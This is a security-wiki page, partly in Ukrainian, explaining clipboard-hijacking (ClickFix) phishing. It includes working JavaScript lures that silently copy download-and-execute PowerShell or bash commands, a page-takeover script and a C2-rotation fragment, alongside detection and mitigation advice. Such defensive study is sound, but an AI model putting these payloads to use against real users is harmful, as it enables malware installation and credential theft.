# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ніколи не вставляйте те, що ви самі не копіювали." – стара, але все ще слушна порада

## Огляд

Clipboard hijacking – also known as *pastejacking* – зловживає тим, що користувачі рутинно копіюють і вставляють команди, не перевіряючи їх. Зловмисна веб-сторінка (або будь-який контекст з підтримкою JavaScript, такий як Electron або Desktop application) програмно поміщає контрольований атакуючим текст у системний буфер обміну. Жертв зазвичай заохочують, за допомогою ретельно продуманих інструкцій соціальної інженерії, натиснути **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), або відкрити термінал і *paste* вміст буфера обміну, що призводить до негайного виконання довільних команд.

Оскільки **no file is downloaded and no attachment is opened**, ця техніка обходить більшість контролів безпеки електронної пошти та веб-контенту, які моніторять attachments, macros або direct command execution. Тому атака популярна в phishing-кампаніях, що доставляють commodity malware families такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Старіші кампанії використовували `document.execCommand('copy')`, новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).

## Потік ClickFix / ClearFake

1. Користувач відвідує typosquatted або скомпрометований сайт (наприклад `docusign.sa[.]com`)
2. Ін’єктований JavaScript **ClearFake** викликає допоміжну функцію `unsecuredCopyToClipboard()`, яка приховано зберігає Base64-кодований PowerShell one-liner у буфері обміну.
3. HTML-інструкції кажуть жертві: *“Натисніть **Win + R**, вставте команду й натисніть Enter, щоб вирішити проблему.”*
4. `powershell.exe` виконується, завантажуючи архів, що містить легітимний виконуваний файл та шкідливий DLL (класичний DLL sideloading).
5. Лоадер розшифровує додаткові стадії, інжектує shellcode і встановлює persistence (наприклад scheduled task) – в кінцевому підсумку запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.

### Приклад ланцюга NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає у своєму каталозі `msvcp140.dll`.
* Зловмисний DLL динамічно отримує адреси API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх, використовуючи rolling XOR key `"https://google.com/"`, інжектує фінальний shellcode та розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Запускає JScript downloader у **cscript.exe**
3. Отримує MSI payload → розміщує `libcef.dll` поряд із підписаним додатком → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Виклик **mshta** запускає прихований PowerShell-скрипт, який завантажує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відновлює `AutoIt3.exe` за допомогою `extrac32` та конкатенації файлів і нарешті запускає `.a3x`-скрипт, який exfiltrates облікові дані браузера на `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK з ротацією C2 (PureHVNC)

Деякі кампанії ClickFix повністю обходяться без завантаження файлів і наказують жертвам вставити one‑liner, який завантажує та виконує JavaScript через WSH, забезпечує персистентність і щодня ротує C2. Приклад спостереженого ланцюга:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Key traits
- Замаскований URL розгортається навпаки під час виконання, щоб перешкодити поверхневій інспекції.
- JavaScript самозберігається через Startup LNK (WScript/CScript) і обирає C2 за поточним днем — що дозволяє швидку ротацію доменів.

Minimal JS fragment used to rotate C2s by date:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто пінячи TLS на захардкодженому сертифікаті та дроблячи трафік.

Detection ideas specific to this variant
- Дерево процесів: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Артефакти автозавантаження: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, що викликає WScript/CScript з шляхом до JS під `%TEMP%`/`%APPDATA%`.
- Реєстр/RunMRU та телеметрія командного рядка, що містять `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторювані виклики `powershell -NoProfile -NonInteractive -Command -` з великими stdin payload'ами для підживлення довгих скриптів без довгих командних рядків.
- Заплановані Tasks, які потім виконують LOLBins, наприклад `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` під виглядом оновлювача/шляху (наприклад, `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Щоденно ротаційні C2 hostnames та URL-и з шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Корелюйте події запису в clipboard, за якими йде вставка через Win+R і негайне виконання `powershell.exe`.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію команд **Win + R** – шукайте незвичайні Base64 / обфусковані записи.
* Security Event ID **4688** (Process Creation) де `ParentImage` == `explorer.exe` та `NewProcessName` у { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створення файлів у `%LocalAppData%\Microsoft\Windows\WinX\` або у тимчасових папках безпосередньо перед підозрілою подією 4688.
* EDR clipboard sensors (якщо присутні) – корелюйте `Clipboard Write`, за яким одразу слідує новий процес PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Останні кампанії масово генерують фейкові CDN/browser verification pages ("Just a moment…", IUAM-style), які примушують користувачів копіювати OS-specific команди з їх clipboard у native консоль. Це виводить виконання за межі browser sandbox і працює як на Windows, так і на macOS.

Key traits of the builder-generated pages
- Виявлення OS через `navigator.userAgent` для підгонки payloads (Windows PowerShell/CMD vs. macOS Terminal). Опціональні decoys/no-ops для непідтримуваних ОС, щоб підтримати ілюзію.
- Автоматичне копіювання в clipboard на безпечні дії UI (checkbox/Copy), при цьому видимий текст може відрізнятися від вмісту clipboard.
- Блокування мобільних пристроїв та поповер із покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Опційна обфускація та single-file injector для перезапису DOM скомпрометованого сайту Tailwind-styled verification UI (без потреби реєстрації нового домену).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence початкового запуску
- Використовуйте `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` щоб виконання продовжувалося після закриття терміналу, зменшуючи видимі артефакти.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ідеї виявлення та хантінгу, специфічні для приманок стилю IUAM
- Веб: Сторінки, які прив'язують Clipboard API до верифікаційних віджетів; невідповідність між відображеним текстом і вмістом буфера обміну; `navigator.userAgent`-галуження; Tailwind + single-page replace у підозрілих контекстах.
- Кінцева точка Windows: `explorer.exe` → `powershell.exe`/`cmd.exe` ненадовго після взаємодії з браузером; batch/MSI інсталятори, запущені з `%TEMP%`.
- Кінцева точка macOS: Terminal/iTerm, що породжують `bash`/`curl`/`base64 -d` з `nohup` поблизу подій браузера; фонові задачі, які переживають закриття терміналу.
- Корелюйте історію `RunMRU` (Win+R) та записи в буфер обміну з подальшим створенням консольних процесів.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – вимкніть дозвіл на запис у буфер обміну (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагайте жест користувача.
2. Security awareness – навчіть користувачів *вводити вручну* чутливі команди або спочатку вставляти їх у текстовий редактор.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control для блокування довільних однорядкових команд.
4. Мережеві контролі – блокувати вихідні запити до відомих доменів, пов'язаних з pastejacking та malware C2.

## Related Tricks

* **Discord Invite Hijacking** часто зловживає тим самим підходом ClickFix після заманювання користувачів на шкідливий сервер:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
